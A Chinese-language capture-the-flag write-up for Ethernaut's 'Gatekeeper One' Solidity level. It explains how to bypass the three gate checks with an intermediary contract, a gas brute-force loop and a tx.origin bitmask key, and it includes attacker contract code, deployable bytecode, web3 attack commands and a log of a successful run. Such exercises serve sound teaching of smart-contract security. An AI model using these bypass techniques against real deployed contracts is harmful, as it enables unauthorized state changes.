# 14 Gatekeeper one

## 思路

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

目标: 调用`enter`函数, 突破其是三个modifier

### 关卡 1:

```solidity
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
```

要求`(msg.sender != tx.origin` ,这个很容易, 搞一个合约, 通过合约来调用`enter`函数

参考这里 https://yinhui1984.github.io/solidity_tx_origin_msg_sender/

```solidity
contract Attacker {
    function Attack(address target) public {
        GatekeeperOne keeper = GatekeeperOne(target);
       
        bytes8 key = xxx
        keeper.enter(key);
    }
}
```

### 关卡2

```solidity
  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }
```

要求运行到代码处, 剩余gas是8191的整数倍. 正常情况下, 这是无解的, 因为不同的编译器版本, 优化选项都会导致我们的合约代码运行到此处时所消耗的gas有所不同, 企图传入特定的gas数量进行函数调用时很难搞的.

```solidity
keeper.enter{gas: XXXX}(key);
```

所以, brute force:

```solidity

//逐一尝试, 
//因为错误会被revert所以要使用try..catch
//因为可能有多个i值满足要求, 所以要使用
for (uint256 i = 0; i < 8191; i++) {
    try keeper.enter{gas: 2500000 + i}(key) {
       break;
	} catch {}
}
```

其中的25000可以随便选用其它值(但保证不要过于小而out of gas, 或过于大而超过block gas limit)



### 关卡3

```solidity
  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "xxx");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "yyy");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "zzz");
    _;
  }
```

这意味着，整数键在转换为各种字节大小时，需要满足以下条件:

- `0x11111111 == 0x1111`, 只有掩码为 `0x0000FFFF`  才可以, 也就是 `0x11111111 & 0x0000FFFF `
- `0x1111111100001111 != 0x00001111`  掩码 `0xFFFFFFFF0000FFFF`

所以

```solidity
//bytes8 key = tx.origin & 0xFFFFFFFF0000FFFF;

bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

```

> 现在不允许不同大小的byteX和uintY之间的转换，因为byteX的填充在右边，而uintY的填充在左边，这可能会导致意外的转换结果。现在必须在转换前在类型内调整大小。例如，你可以将bytes4（4字节）转换为uint64（8字节），首先将bytes4变量转换成bytes8，然后再转换成uint64。当通过uint32转换时，你会得到相反的padding。
> *https://docs.soliditylang.org/en/v0.8.0/050-breaking-changes.html?highlight=Conversions*



### 结论:

```solidity
contract Attacker {
    //address为题目中的被攻击的合约的地址
    function Attack(address target) public {
        GatekeeperOne keeper = GatekeeperOne(target);
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 8191; i++) {
            try keeper.enter{gas: 2500000 + i}(key) {
                break;
            } catch {}
        }
    }
}
```



```js
let abi = [{"inputs":[{"internalType":"address","name":"target","type":"address"}],"name":"Attack","outputs":[],"stateMutability":"nonpayable","type":"function"}]
let byteCode = "0x" +
        "608060405234801561001057600080fd5b50610374806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063bc346c9c14610030575b600080fd5b61004a6004803603810190610045919061017f565b61004c565b005b6000819050600067ffffffff0000ffff60c01b3260c01b16905060005b611fff811015610116578273ffffffffffffffffffffffffffffffffffffffff16633370204e82622625a061009e91906101e5565b846040518363ffffffff1660e01b81526004016100bb9190610276565b60206040518083038160008887f1935050505080156100f857506040513d601f19601f820116820180604052508101906100f591906102c9565b60015b156101035750610116565b808061010e906102f6565b915050610069565b50505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061014c82610121565b9050919050565b61015c81610141565b811461016757600080fd5b50565b60008135905061017981610153565b92915050565b6000602082840312156101955761019461011c565b5b60006101a38482850161016a565b91505092915050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006101f0826101ac565b91506101fb836101ac565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156102305761022f6101b6565b5b828201905092915050565b60007fffffffffffffffff00000000000000000000000000000000000000000000000082169050919050565b6102708161023b565b82525050565b600060208201905061028b6000830184610267565b92915050565b60008115159050919050565b6102a681610291565b81146102b157600080fd5b50565b6000815190506102c38161029d565b92915050565b6000602082840312156102df576102de61011c565b5b60006102ed848285016102b4565b91505092915050565b6000610301826101ac565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203610333576103326101b6565b5b60018201905091905056fea26469706673582212208507b0208780072db3d911b98513d51166b931707a2f1de58e64e85e0cd98b4264736f6c634300080f0033"

//deploy it
let myContract = new web3.eth.Contract(abi);
let deploy = myContract.deploy({
	data: byteCode,
	arguments: []
});
let myInstance = await deploy.send({
	from: player
});


//attack
await myInstance.methods.Attack(instance).send({from: player})

//check
await contract.entrant()
```



## 参考答案

```
^^.js:45 ( ͡° ͜ʖ ͡°) 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 10:17:53.785
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x3851762a4491cfc48662f9b1425fba33c5885901187aa8c2ec05bcf9675d6538
^^.js:35 => 实例地址0x476555eE64a4540cDfa262Fe3D0A7dB8C61bC486
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 10:18:01.104
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x3851762a4491cfc48662f9b1425fba33c5885901187aa8c2ec05bcf9675d6538
redux-logger.js:1  action SET_BLOCK_NUM @ 10:18:11.575
let abi = [{"inputs":[{"internalType":"address","name":"target","type":"address"}],"name":"Attack","outputs":[],"stateMutability":"nonpayable","type":"function"}]
let byteCode = "0x" +
        "608060405234801561001057600080fd5b50610374806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063bc346c9c14610030575b600080fd5b61004a6004803603810190610045919061017f565b61004c565b005b6000819050600067ffffffff0000ffff60c01b3260c01b16905060005b611fff811015610116578273ffffffffffffffffffffffffffffffffffffffff16633370204e82622625a061009e91906101e5565b846040518363ffffffff1660e01b81526004016100bb9190610276565b60206040518083038160008887f1935050505080156100f857506040513d601f19601f820116820180604052508101906100f591906102c9565b60015b156101035750610116565b808061010e906102f6565b915050610069565b50505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061014c82610121565b9050919050565b61015c81610141565b811461016757600080fd5b50565b60008135905061017981610153565b92915050565b6000602082840312156101955761019461011c565b5b60006101a38482850161016a565b91505092915050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006101f0826101ac565b91506101fb836101ac565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156102305761022f6101b6565b5b828201905092915050565b60007fffffffffffffffff00000000000000000000000000000000000000000000000082169050919050565b6102708161023b565b82525050565b600060208201905061028b6000830184610267565b92915050565b60008115159050919050565b6102a681610291565b81146102b157600080fd5b50565b6000815190506102c38161029d565b92915050565b6000602082840312156102df576102de61011c565b5b60006102ed848285016102b4565b91505092915050565b6000610301826101ac565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203610333576103326101b6565b5b60018201905091905056fea26469706673582212208507b0208780072db3d911b98513d51166b931707a2f1de58e64e85e0cd98b4264736f6c634300080f0033"

//deploy it
let myContract = new web3.eth.Contract(abi);
let deploy = myContract.deploy({
	data: byteCode,
	arguments: []
});
let myInstance = await deploy.send({
	from: player
});

^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x9e95d1fa87d4790e46cb2b81ed5a294c1b3dfbd45090b42654e459dd1afce291
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x9e95d1fa87d4790e46cb2b81ed5a294c1b3dfbd45090b42654e459dd1afce291
undefined
redux-logger.js:1  action SET_BLOCK_NUM @ 10:21:10.762
instance
"0x476555eE64a4540cDfa262Fe3D0A7dB8C61bC486"
await myInstance.Attack(instance)
VM109:1 Uncaught TypeError: myInstance.Attack is not a function
    at <anonymous>:1:18
(anonymous) @ VM109:1
await myInstance.methods.Attack(instance)
{call: ƒ, send: ƒ, encodeABI: ƒ, estimateGas: ƒ, createAccessList: ƒ, …}
await myInstance.methods.Attack(instance).send({from: player})
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x0b078e6d2f995625c9436b675cdd7137c06dea7b27f9c399b3b6e7e7777440d8
{transactionHash: "0x0b078e6d2f995625c9436b675cdd7137c06dea7b27f9c399b3b6e7e7777440d8", transactionIndex: 0, blockNumber: 303, blockHash: "0x01d2bd86e59565d71a31eea930c4f0cefa0ef0f2964c8fc6458c595d921f38d7", from: "0x6bb44376acf37ee3ceb584289f4b9b037c8f6a7d", …}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x0b078e6d2f995625c9436b675cdd7137c06dea7b27f9c399b3b6e7e7777440d8
redux-logger.js:1  action SET_BLOCK_NUM @ 10:26:10.784
await contract.entrant()
"0x6bb44376acF37ee3cEb584289f4B9B037c8f6a7D"
^^.js:45 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 10:26:59.755
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xb1f7062197f74fc71fac02ea8276dbb95f2adabed139d1e88763b44a8e032dee
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 10:27:06.582
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xb1f7062197f74fc71fac02ea8276dbb95f2adabed139d1e88763b44a8e032dee
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:73 ٩(- ̮̮̃-̃)۶ 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 10:27:10.752

```

